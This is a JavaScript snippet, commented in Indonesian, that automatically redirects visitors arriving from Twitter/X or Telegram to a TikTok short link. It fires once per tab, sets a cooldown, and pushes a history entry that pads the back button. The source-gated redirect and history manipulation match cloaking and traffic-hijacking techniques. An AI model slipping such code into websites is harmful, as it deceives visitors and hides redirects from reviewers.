(function () {
  try {
    // === SETTING (ganti sesuai kebutuhan) ===
    var target = "https://vt.tiktok.com/ZSAxu15t4/"; // Wajib HTTPS
    var cooldownMs = 20 * 1000;           // 20 detik

    if (!/^https:\/\//i.test(target)) return;
    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(location.search + location.hash)) return;

    // Deteksi sumber: prioritas referrer, fallback UA (sekali saat navigate)
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var fromRef = /(t\.co|twitter\.com|t\.me|telegram\.org)/i.test(REF);
    var fromUA  = /(twitter|telegram)/i.test(UA);

    // Hanya saat NAVIGATE pertama (bukan reload/back/forward)
    var nav = (performance.getEntriesByType && performance.getEntriesByType("navigation") || [])[0];
    var navType = nav && nav.type || "navigate";
    if (navType !== "navigate") return;

    // Gate per-tab (anti-loop di tab yang sama)
    var page = location.origin + location.pathname;
    var sessKey = "tw_tg_seen:" + page;
    if (sessionStorage.getItem(sessKey)) return;

    // Cooldown lintas-kunjungan/tab
    var cdKey = "redirCooldown:" + page + "|" + target + "|tw_tg";
    var now   = Date.now();
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    // Syarat izinnya
    var allowed = fromRef || (!fromRef && fromUA);
    if (!allowed) return;

    // Set gate LEBIH DULU (hindari retrigger kalau balik/reload)
    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // --- penting: tambahkan "bantalan" history supaya tab tidak langsung hilang saat kembali ---
    try {
      // Dorong satu state ke history agar ada entry tambahan
      history.pushState({ hold: 1 }, "", location.href);
      // Optional: bisa dorong lagi kalau perlu dua lapis (uncomment kalau masih “hilang”):
      // history.pushState({ hold: 2 }, "", location.href);
    } catch(_) {}

    // --- redirect AUTO (tanpa pemicu) — JANGAN gunakan replace ---
    location.href = target; // cukup satu ini. Hindari assign/replace berlapis agar history aman.

  } catch (_) {}
})();
